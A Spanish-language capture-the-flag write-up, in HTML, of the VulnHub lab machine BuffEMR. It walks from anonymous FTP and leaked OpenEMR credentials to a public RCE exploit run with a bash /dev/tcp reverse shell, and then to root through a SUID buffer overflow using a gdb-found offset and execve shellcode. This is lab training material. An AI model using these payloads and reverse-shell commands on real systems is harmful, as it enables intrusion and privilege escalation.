@@ -1,0 +1,382 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup BuffEMR VulnHub</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/wr/buffemr.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup BuffEMR VulnHub" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina BuffEMR de la plataforma de VulnHub" />
+<meta property="og:description" content="Resolución de la máquina BuffEMR de la plataforma de VulnHub" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup BuffEMR VulnHub" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup BuffEMR VulnHub" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina BuffEMR de la plataforma de VulnHub","headline":"Writeup Dina 1.0.1 Vulnhub","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup BuffEMR VulnHub</h1>
+          <p>Resolución de la máquina BuffEMR de la plataforma de VulnHub</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 192.168.100.47
+Nmap scan report for 192.168.100.47
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div>
+
+<div><p>Al entrar por ftp podemos ver el directorio share y dentro otro llamado openemr</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ftp</span><span class="p"> 192.168.100.47
+Connected to 192.168.100.47.
+220 (vsFTPd 3.0.3)
+Name (192.168.100.47:root): </span><span class="kd">anonymous</span><span class="p">
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</span><span class="kd">ftp></span><span class="p"> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    3 0        0            4096 Jun 21  2021 </span><span class="na">share</span><span class="p">
+226 Directory send OK.
+</span><span class="kd">ftp></span><span class="p"> cd share
+250 Directory successfully changed.
+</span><span class="kd">ftp></span><span class="p"> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0              20 Jun 21  2021 README
+drwxr-xr-x   31 0        0            4096 Jun 21  2021 </span><span class="na">openemr</span><span class="p">
+226 Directory send OK.
+</span><span class="kd">ftp></span>
+</code></pre></div></div>
+
+<div><p>Hay demasiados archivos en carpetas para revisar uno por uno, con wget lo descargamos todo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wget</span><span class="p"> -r ftp://192.168.100.47/share/openemr &>/dev/null
+</span>
+</code></pre></div></div>
+
+<div><p>Ya que la carpeta se llama openemr podemos pensar que el directorio existe en la web, es un login</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Podemos buscar credenciales de un usuario por ejemplo admin y encontramos Monster123</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">192.168.100.47/share/openemr </span><span class="s2">❯ grep </span><span class="p">-r ^admin:
+</span><span class="k">tests/test.accounts</span><span class="na">:</span><span class="kd">admin:</span><span class="p">Monster123</span>
+</code></pre></div></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>En el apartado about podemos ver la versión que es la 5.0.1.3</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Buscando exploits podemos encontrar uno para ejecutar comandos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ searchsploit</span><span class="p"> openemr 5.0.1.3 
+-------------------------------------------------------------------------------- -------------------------
+ Exploit Title                                                                  |  Path
+-------------------------------------------------------------------------------- -------------------------
+OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)     | php/webapps/49998.py
+OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated) (2) | php/webapps/50122.rb
+OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions                        | linux/webapps/45202.txt
+OpenEMR 5.0.1.3 - Authentication Bypass                                         | php/webapps/50017.py
+OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)                         | php/webapps/45161.py
+-------------------------------------------------------------------------------- -------------------------</span>
+</code></pre></div></div>
+
+<div><p>Lo copiamos y lo ejecutamos con los argumentos que nos pide para hacer una revshell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ searchsploit</span><span class="p"> -m 45161.py
+  Exploit: OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)
+      URL: https://www.exploit-db.com/exploits/45161
+     Path: /usr/share/exploitdb/exploits/php/webapps/45161.py
+File Type: ASCII text
+
+Copied to: /root/45161.py
+
+</span><span class="s2">❯ python </span><span class="p">45161.py
+usage: 45161.py [-h] [-u USER] [-p PASSWORD] [-c CMD] host
+45161.py: error: too few arguments
+
+</span><span class="s2">❯ python</span><span class="p"> 45161.py -u admin -p Monster123 -c </span><span class="no">"bash -i >& /dev/tcp/192.168.100.41/443 0>&1"</span><span class="p"> http://192.168.100.47/openemr
+</span><span class="s2"> .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
+/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   
+| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   
+| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    
+\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \   
+ )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\  
+(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) 
+                                                       
+</span><span class="p">   ={   </span><span class="s2">P R O J E C T    I N S E C U R I T Y</span><span class="p">   }=
+                                                       
+         Twitter : </span><span class="s2">@Insecurity                       </span><span class="p">
+         Site    : </span><span class="s2">insecurity.sh                     </span><span class="p">
+
+[</span><span class="s2">$</span><span class="p">] Authenticating with admin:Monster123
+[</span><span class="s2">$</span><span class="p">] Injecting payload
+[</span><span class="s2">$</span><span class="p">] Payload executed</span>
+</code></pre></div></div>
+
+<div><p>Ahora en el listener de netcat recibimos la shell como www-data</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 192.168.100.47
+</span><span class="s2">www-data@buffemr</span><span class="p">:</span><span class="na">~/html/openemr/interface/main</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="s2">www-data@buffemr</span><span class="p">:</span><span class="na">~/html/openemr/interface/main</span><span class="p">$ hostname -I
+192.168.100.47 
+</span><span class="s2">www-data@buffemr</span><span class="p">:</span><span class="na">~/html/openemr/interface/main</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos ver un archivo zip, ya que en /var no podemos escribir lo movemos a /dev/shm</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@buffemr</span><span class="p">:</span><span class="na">/var</span><span class="p">$ ls -l user.zip 
+-rw-r--r-- 1 root root 309 Jun 21  2021 </span><span class="kd">user.zip</span><span class="p">
+</span><span class="s2">www-data@buffemr</span><span class="p">:</span><span class="na">/var</span><span class="p">$ cp user.zip /dev/shm
+</span><span class="s2">www-data@buffemr</span><span class="p">:</span><span class="na">/var</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>El archivo al intentar descomprimirlo nos pide una contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@buffemr</span><span class="p">:</span><span class="na">/dev/shm</span><span class="p">$ unzip user.zip 
+Archive:  user.zip
+[user.zip] user.lst password:</span>
+</code></pre></div></div>
+
+<div><p>En un archivo de lo que descargamos de ftp podemos encontrar la contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">192.168.100.47/share/openemr/sql </span><span class="s2">❯ cat</span><span class="p"> keys.sql
+CREATE TABLE ENCKEY(id INT, name VARCHAR(20), enckey VARCHAR(50));
+
+INSERT into ENCKEY (id, name, enckey) VALUES (1, "pdfkey", "</span><span class="kd">c2FuM25jcnlwdDNkCg==</span><span class="p">");</span>
+</code></pre></div></div>
+
+<div><p>Ahora con la contraseña lo descomprimimos, tiene un archivo con credenciales ssh</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@buffemr</span><span class="p">:</span><span class="na">/dev/shm</span><span class="p">$ unzip user.zip 
+Archive:  user.zip
+[user.zip] user.lst password: </span><span class="kd">c2FuM25jcnlwdDNkCg==</span><span class="p">
+  inflating: user.lst                
+</span><span class="s2">www-data@buffemr</span><span class="p">:</span><span class="na">/dev/shm</span><span class="p">$ cat user.lst 
+This file contain senstive information, therefore, should be always encrypted at rest.
+
+</span><span class="na">buffemr</span><span class="p"> - </span><span class="kd">Iamgr00t</span><span class="p">
+
+****** Only I can SSH in ************
+</span><span class="s2">www-data@buffemr</span><span class="p">:</span><span class="na">/dev/shm</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Nos conectamos por ssh y conseguimos la primera flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">buffemr@192.168.100.47
+buffemr@192.168.100.47's password: </span><span class="kd">Iamgr00t</span><span class="p">
+</span><span class="s2">buffemr@buffemr</span><span class="p">:</span><span class="na">~</span><span class="p">$ whoami
+buffemr
+</span><span class="s2">buffemr@buffemr</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+192.168.100.47 
+</span><span class="s2">buffemr@buffemr</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user_flag.txt 
+    .-.    ))    wWw \\\  ///      wWw \\\    ///()_()                                                                 
+  c(O_O)c (o0)-. (O)_((O)(O))      (O)_((O)  (O))(O o)                                                                 
+ ,'.---.`, | (_))/ __)| \ ||       / __)| \  / |  |^_\                                                                 
+/ /|_|_|\ \| .-'/ (   ||\\||      / (   ||\\//||  |(_))                                                                
+| \_____/ ||(  (  _)  || \ |     (  _)  || \/ ||  |  /                                                                 
+'. `---' .` \)  \ \_  ||  ||      \ \_  ||    ||  )|\\                                                                 
+  `-...-'   (    \__)(_/  \_)      \__)(_/    \_)(/  \)                                                                
+ wWw  wWw  oo_     wWw ()_()        c  c     .-.   \\\    /// ))   ()_()     .-.   \\\    ///wW  Ww oo_     wWw  _     
+ (O)  (O) /  _)-<  (O)_(O o)        (OO)   c(O_O)c ((O)  (O))(o0)-.(O o)   c(O_O)c ((O)  (O))(O)(O)/  _)-<  (O)_/||_   
+ / )  ( \ \__ `.   / __)|^_\      ,'.--.) ,'.---.`, | \  / |  | (_))|^_\  ,'.---.`, | \  / |  (..) \__ `.   / __)/o_)  
+/ /    \ \   `. | / (   |(_))    / //_|_\/ /|_|_|\ \||\\//||  | .-' |(_))/ /|_|_|\ \||\\//||   ||     `. | / (  / |(\  
+| \____/ |   _| |(  _)  |  /     | \___  | \_____/ ||| \/ ||  |(    |  / | \_____/ ||| \/ ||  _||_    _| |(  _) | | )) 
+'. `--' .`,-'   | \ \_  )|\\     '.    ) '. `---' .`||    ||   \)   )|\\ '. `---' .`||    || (_/\_),-'   | \ \_ | |//  
+  `-..-' (_..--'   \__)(/  \)      `-.'    `-...-' (_/    \_)  (   (/  \)  `-...-' (_/    \_)     (_..--'   \__)\__/   
+
+
+
+COnGRATS !! lETs get ROOT now ....!!
+</span><span class="s2">buffemr@buffemr</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Buscando archivos suid encontramos uno en /opt llamado dontexecute</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">buffemr@buffemr</span><span class="p">:</span><span class="na">~</span><span class="p">$ find / -perm -4000 2>/dev/null | grep -vE "snap|lib"
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/traceroute6.iputils
+/usr/bin/arping
+/usr/bin/chsh
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/sbin/pppd
+/bin/fusermount
+/bin/mount
+/bin/su
+/bin/ping
+/bin/umount
+</span><span class="kd">/opt/dontexecute</span><span class="p">
+</span><span class="s2">buffemr@buffemr</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>El archivo pertenece a root, como nos dice que no lo ejecutemos... lo ejecutamos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">buffemr@buffemr</span><span class="p">:</span><span class="na">/opt</span><span class="p">$ ls -l
+-rwsrwxr-x 1 root root 7700 Jun 23  2021 </span><span class="kd">dontexecute</span><span class="p">
+</span><span class="s2">buffemr@buffemr</span><span class="p">:</span><span class="na">/opt</span><span class="p">$ ./dontexecute
+Usage: ./dontexecute argument
+</span><span class="s2">buffemr@buffemr</span><span class="p">:</span><span class="na">/opt</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Nos pide un argumento, al pasarlo no nos reporta nada, pero con 1000 A segmentation fault</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">buffemr@buffemr</span><span class="p">:</span><span class="na">/opt</span><span class="p">$ ./dontexecute test
+</span><span class="s2">buffemr@buffemr</span><span class="p">:</span><span class="na">/opt</span><span class="p">$</span><span class="p"> ./dontexecute $(python3 -c 'print("A"*1000)')
+Segmentation fault (core dumped)
+</span><span class="s2">buffemr@buffemr</span><span class="p">:</span><span class="na">/opt</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Lo pasamos por gdb para conseguir el offset que es de 512 bytes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gdb</span><span class="p"> -q ./dontexecute
+Reading symbols from ./dontexecute...
+(No debugging symbols found in ./dontexecute)
+</span><span class="kd">gdb-peda$</span><span class="p"> pattern_create 1000 pattern
+Writing pattern of 1000 chars to filename "pattern"
+</span><span class="kd">gdb-peda$</span><span class="p"> run $(cat pattern)
+Starting program: /root/dontexecute $(cat pattern)
+
+Program received signal SIGSEGV, Segmentation fault.
+</span><span class="na">[----------------------------------registers-----------------------------------]</span><span class="p">
+</span><span class="s2">EAX</span><span class="p">: </span><span class="na">0xffffd17c</span><span class="p"> ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
+</span><span class="s2">EBX</span><span class="p">: 0x37734168 ('hAs7')
+</span><span class="s2">ECX</span><span class="p">: </span><span class="na">0xffffda20</span><span class="p"> ("ZA$x")
+</span><span class="s2">EDX</span><span class="p">: </span><span class="na">0xffffd560</span><span class="p"> ("ZA$x")
+</span><span class="s2">ESI</span><span class="p">: </span><span class="na">0xf7d97000</span><span class="p"> --> 0x1e4d6c 
+</span><span class="s2">EDI</span><span class="p">: </span><span class="na">0xf7d97000</span><span class="p"> --> 0x1e4d6c 
+</span><span class="s2">EBP</span><span class="p">: 0x414d7341 ('AsMA')
+</span><span class="s2">ESP</span><span class="p">: </span><span class="na">0xffffd380</span><span class="p"> ("8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiA"...)
+</span><span class="s2">EIP</span><span class="p">: 0x73416973 ('siAs')
+</span><span class="s2">EFLAGS</span><span class="p">: 0x10282 (</span><span class="s2">carry parity adjust zero </span><span class="kd">SIGN</span><span class="s2"> trap </span><span class="kd">INTERRUPT </span><span class="s2">direction overflow</span><span class="p">)
+</span><span class="na">[-------------------------------------code-------------------------------------]</span><span class="p">
+</span><span class="kd">Invalid $PC address: 0x73416973</span><span class="na">
+[------------------------------------stack-------------------------------------]</span><span class="p">
+0000| </span><span class="na">0xffffd380</span><span class="p"> ("8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiA"...)
+0004| </span><span class="na">0xffffd384</span><span class="p"> ("AsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8AB"...)
+0008| </span><span class="na">0xffffd388</span><span class="p"> ("s9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABj"...)
+0012| </span><span class="na">0xffffd38c</span><span class="p"> ("OAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9A"...)
+0016| </span><span class="na">0xffffd390</span><span class="p"> ("AsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOAB"...)
+0020| </span><span class="na">0xffffd394</span><span class="p"> ("slAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABP"...)
+0024| </span><span class="na">0xffffd398</span><span class="p"> ("QAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlA"...)
+0028| </span><span class="na">0xffffd39c</span><span class="p"> ("AsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQAB"...)
+</span><span class="na">[------------------------------------------------------------------------------]</span><span class="p">
+Legend: </span><span class="kd">code</span><span class="p">,</span><span class="na"> data</span><span class="p">, </span><span class="s2">rodata</span><span class="p">, value
+Stopped reason: </span><span class="kd">SIGSEGV</span><span class="p">
+</span><span class="na">0x73416973 </span><span class="p">in</span><span class="no"> ??</span><span class="p"> ()
+</span><span class="kd">gdb-peda$</span><span class="p"> pattern_offset 0x73416973
+1933666675 found at offset: </span><span class="kd">512</span><span class="p">
+</span><span class="kd">gdb-peda$</span>
+</code></pre></div></div>
+
+<div><p>Para el exploit empezamos definiendo un <a href="https://www.exploit-db.com/exploits/13697">shellcode </a>en este caso que ejecute bash -p</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">shellcode </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"</span>
+</code></pre></div></div>
+
+<div><p>Ahora la cantidad de A necesarias, serian los 512 del offset menos el tamaño del shellcode</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">offset </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="p"> (</span><span class="na">512</span><span class="kd"> -</span><span class="k"> len</span><span class="p">(shellcode))</span>           
+</code></pre></div></div>
+
+<div><p>Finalmente printeamos las A y el shellcode</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="k">print</span><span class="p">(offset </span><span class="kd">+</span><span class="p"> shellcode)</span>           
+</code></pre></div></div>
+
+<div><p>El script final para explotar el binario quedaria algo asi</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">shellcode </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
+</span><span class="p">offset </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="p"> (</span><span class="na">512</span><span class="kd"> -</span><span class="k"> len</span><span class="p">(shellcode))
+</span><span class="k">print</span><span class="p">(offset </span><span class="kd">+</span><span class="p"> shellcode)</span>
+</code></pre></div></div>
+
+<div><p>Pasamos el script a la maquina y ejecutamos el binario con el exploit como argumento</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">buffemr@buffemr</span><span class="p">:</span><span class="na">/opt</span><span class="p">$ cat exploit.py 
+shellcode = b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
+offset = b"A" * (512 - len(shellcode))
+print(offset + shellcode)
+</span><span class="s2">buffemr@buffemr</span><span class="p">:</span><span class="na">/opt</span><span class="p">$ ./dontexecute $(python exploit.py)
+bash-4.4#</span>
+</code></pre></div></div>
+
+<div><p>El resultado es una bash como root, ahora simplemente leemos la flag privilegiada</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">bash-4.4# whoami
+root
+bash-4.4# hostname -I
+192.168.100.47 
+bash-4.4# cat /root/Root_flag.txt                                                                                                                                           
+________                __  __                       ____                                  _____                                        ___ 
+`MMMMMMMb.             69MM69MM                     6MMMMb                                69M`MM                                        `MM 
+ MM    `Mb            6M' 6M' `                    8P    Y8                              6M' `MM                                         MM 
+ MM     MM ___   ___ _MM__MM______  ___  __       6M      Mb ____    ___  ____  ___  __ _MM__ MM   _____  ____    _    ___  ____     ____MM 
+ MM    .M9 `MM    MM MMMMMMMM6MMMMb `MM 6MM       MM      MM `MM(    )M' 6MMMMb `MM 6MM MMMMM MM  6MMMMMb `MM(   ,M.   )M' 6MMMMb   6MMMMMM 
+ MMMMMMM(   MM    MM  MM  MM6M'  `Mb MM69 "       MM      MM  `Mb    d' 6M'  `Mb MM69 "  MM   MM 6M'   `Mb `Mb   dMb   d' 6M'  `Mb 6M'  `MM 
+ MM    `Mb  MM    MM  MM  MMMM    MM MM'          MM      MM   YM.  ,P  MM    MM MM'     MM   MM MM     MM  YM. ,PYM. ,P  MM    MM MM    MM 
+ MM     MM  MM    MM  MM  MMMMMMMMMM MM           MM      MM    MM  M   MMMMMMMM MM      MM   MM MM     MM  `Mb d'`Mb d'  MMMMMMMM MM    MM 
+ MM     MM  MM    MM  MM  MMMM       MM           YM      M9    `Mbd'   MM       MM      MM   MM MM     MM   YM,P  YM,P   MM       MM    MM 
+ MM    .M9  YM.   MM  MM  MMYM    d9 MM            8b    d8      YMP    YM    d9 MM      MM   MM YM.   ,M9   `MM'  `MM'   YM    d9 YM.  ,MM 
+_MMMMMMM9'   YMMM9MM__MM__MM_YMMMM9 _MM_            YMMMM9        M      YMMMM9 _MM_    _MM_ _MM_ YMMMMM9     YP    YP     YMMMM9   YMMMMMM_
+
+________                                           ___        8   8                                                                         
+`MMMMMMMb.                                         `MM       (M) (M)                                                                        
+ MM    `Mb                      /                   MM       (M) (M)                                                                        
+ MM     MM   _____     _____   /M      ____     ____MM       (M) (M)                                                                        
+ MM     MM  6MMMMMb   6MMMMMb /MMMMM  6MMMMb   6MMMMMM        M   M                                                                         
+ MM    .M9 6M'   `Mb 6M'   `Mb MM    6M'  `Mb 6M'  `MM        M   M                                                                         
+ MMMMMMM9' MM     MM MM     MM MM    MM    MM MM    MM        M   M                                                                         
+ MM  \M\   MM     MM MM     MM MM    MMMMMMMM MM    MM        8   8                                                                         
+ MM   \M\  MM     MM MM     MM MM    MM       MM    MM                                                                                      
+ MM    \M\ YM.   ,M9 YM.   ,M9 YM.  ,YM    d9 YM.  ,MM       68b 68b                                                                        
+_MM_    \M\_YMMMMM9   YMMMMM9   YMMM9 YMMMM9   YMMMMMM_      Y89 Y89  
+
+COngratulations !!! Tweet me at @san3ncrypt3d ! 
+
+bash-4.4#</span>
+</code></pre></div></div>
+
+<div><p>Aunque realmente esperaba un bof mas complicado ya que la maquina se llama buffemr, debo decir que en general me ha parecido una maquina bastante buena ;)</p></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+    </div>
+  </body>
+</html>
